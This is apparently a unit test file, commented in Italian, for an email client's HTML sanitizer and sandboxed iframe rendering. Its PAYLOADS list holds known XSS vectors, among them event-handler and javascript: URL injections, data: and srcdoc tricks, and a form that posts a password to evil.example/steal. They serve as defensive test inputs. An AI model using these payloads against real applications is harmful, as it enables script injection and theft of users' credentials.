// Unit test della pipeline di rendering mail (node --test + jsdom).
// Qui si prova il livello 1 (sanitizzazione strutturale) e la forma
// dell'iframe; che dentro Chromium nulla esegua davvero lo verifica
// tests/e2e.mjs con l'Electron vero.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { JSDOM } = require('jsdom');

function load() {
  const dom = new JSDOM('<!DOCTYPE html><body><div id="host"></div></body>', { runScripts: 'outside-only' });
  const src = fs.readFileSync(path.join(__dirname, '..', 'mail_render.js'), 'utf-8');
  // Esegue mail_render.js nel contesto della finestra jsdom (niente eval).
  vm.runInContext(src, dom.getInternalVMContext());
  return dom.window;
}

const PAYLOADS = {
  script: '<p>ciao</p><script>parent.__xss=1</script>',
  imgOnerror: '<img src="x" onerror="parent.__xss=1">',
  svgOnload: '<svg onload="parent.__xss=1"><circle r="1"/></svg>',
  jsHref: '<a href="javascript:parent.__xss=1">clicca</a>',
  jsHrefObfuscated: '<a href="jAva\tscRipt:parent.__xss=1">clicca</a>',
  vbscript: '<a href="vbscript:msgbox(1)">x</a>',
  iframeSrcdoc: '<iframe srcdoc="<script>parent.parent.__xss=1</script>"></iframe>',
  objectData: '<object data="data:text/html,<script>parent.__xss=1</script>"></object>',
  metaRefresh: '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  baseHref: '<base href="https://evil.example/"><a href="/login">login</a>',
  form: '<form action="https://evil.example/steal" method="post"><input name="pw"><button>ok</button></form>',
  styleExpression: '<div style="width:expression(parent.__xss=1)">x</div>',
  styleTagImport: '<style>@import url("https://evil.example/track.css")</style><p>x</p>',
  bodyOnload: '<html><body onload="parent.__xss=1"><p>x</p></body></html>',
  linkStylesheet: '<link rel="stylesheet" href="https://evil.example/t.css"><p>x</p>',
  dataHtmlImg: '<img src="data:text/html,<script>1</script>">',
  svgDataObject: '<embed src="data:image/svg+xml,<svg onload=parent.__xss=1></svg>">',
};

test('ogni payload XSS noto esce senza script, handler o URL eseguibili', () => {
  const w = load();
  for (const [name, html] of Object.entries(PAYLOADS)) {
    const out = w.MailRender.sanitizeHtml(html);
    const low = out.toLowerCase();
    assert.ok(!/<script[\s>]/.test(low), `${name}: <script> sopravvissuto`);
    assert.ok(!/\son[a-z]+\s*=/.test(low), `${name}: handler on* sopravvissuto`);
    assert.ok(!/javascript:|vbscript:/.test(low.replace(/\s/g, '')), `${name}: URL javascript:/vbscript:`);
    for (const tag of ['iframe', 'object', 'embed', 'base', 'form', 'link', 'input', 'button']) {
      assert.ok(!new RegExp(`<${tag}[\\s>]`).test(low), `${name}: <${tag}> sopravvissuto`);
    }
    assert.ok(!/expression\s*\(/.test(low), `${name}: CSS expression()`);
    assert.ok(!/@import/.test(low), `${name}: @import`);
    assert.ok(!/evil\.example/.test(low) || name === 'baseHref' || name === 'form', `${name}: URL remoto residuo`);
    // l'unico meta ammesso e' il nostro (charset + CSP)
    const metas = (out.match(/<meta\b/gi) || []).length;
    assert.equal(metas, 2, `${name}: meta inattesi (${metas})`);
    assert.ok(out.includes("default-src 'none'"), `${name}: manca la meta-CSP`);
  }
});

test('contenuto legittimo e stili restano', () => {
  const w = load();
  const html = '<html><head><style>.x{color:red}</style></head><body><table><tr><td style="padding:4px"><b>Ciao</b> <a href="https://example.com/p?a=1&b=2">link</a></td></tr></table><img src="https://example.com/logo.png" width="100"></body></html>';
  const out = w.MailRender.sanitizeHtml(html);
  assert.ok(out.includes('<style>.x{color:red}</style>'));
  assert.ok(out.includes('style="padding:4px"'));
  assert.ok(out.includes('<b>Ciao</b>'));
  assert.ok(out.includes('href="https://example.com/p?a=1&amp;b=2"'));
  assert.ok(out.includes('target="_blank"') && out.includes('rel="noopener noreferrer"'));
  assert.ok(out.includes('src="https://example.com/logo.png"'));
});

test('cid: risolto sull allegato giusto, altrimenti pixel trasparente', () => {
  const w = load();
  const atts = [{ name: 'logo.png', contentId: '<logo123@mail>' }, { name: 'firma.jpg', contentId: '<firma@mail>' }];
  const html = '<img src="cid:logo123@mail"><img src="cid:firma"><img src="cid:sconosciuto@x">';
  const out = w.MailRender.sanitizeHtml(html, {
    resolveCid: (cid) => { const a = w.MailRender.matchAttachment(cid, atts); return a ? `/att/${a.name}` : null; },
  });
  assert.ok(out.includes('src="/att/logo.png"'), 'contentId esatto');
  assert.ok(out.includes('src="/att/firma.jpg"'), 'per nome file');
  assert.ok(out.includes(`src="${w.MailRender.BLANK_GIF}"`), 'sconosciuto → pixel');
  assert.ok(!out.includes('cid:'), 'nessun cid: residuo');
});

test('matchAttachment: unico allegato vince, lista vuota → null', () => {
  const w = load();
  assert.equal(w.MailRender.matchAttachment('qualsiasi', [{ name: 'solo.png' }]).name, 'solo.png');
  assert.equal(w.MailRender.matchAttachment('qualsiasi', []), null);
  assert.equal(w.MailRender.matchAttachment('a@b', [{ name: 'x' }, { name: 'y' }]), null);
});

test('renderMailHtml: iframe sandbox senza script e senza popup, link intercettati', () => {
  const w = load();
  const host = w.document.getElementById('host');
  const opened = [];
  const iframe = w.MailRender.renderMailHtml(host, '<p>ciao <a href="https://example.com/x">link</a> <a href="javascript:1">no</a></p>', {
    openExternal: (h) => opened.push(h),
  });
  assert.equal(iframe.getAttribute('sandbox'), 'allow-same-origin');
  assert.equal(iframe.getAttribute('referrerpolicy'), 'no-referrer');
  const iDoc = iframe.contentDocument;
  assert.ok(iDoc.querySelector('meta[http-equiv="Content-Security-Policy"]'), 'meta-CSP nel documento');
  const links = iDoc.querySelectorAll('a');
  assert.equal(links.length, 2);
  assert.equal(links[1].getAttribute('href'), null, 'javascript: href rimosso');
  links[0].dispatchEvent(new w.window.MouseEvent('click', { bubbles: true, cancelable: true }));
  assert.deepEqual(opened, ['https://example.com/x']);
});

test('sanitizeHtml regge input degeneri', () => {
  const w = load();
  for (const v of ['', null, undefined, '<<<', '<html>', 'solo testo', '<script>', '<a href=javascript:1']) {
    const out = w.MailRender.sanitizeHtml(v);
    assert.ok(out.startsWith('<!DOCTYPE html>'), String(v));
    assert.ok(!/<script[\s>]/i.test(out));
  }
});
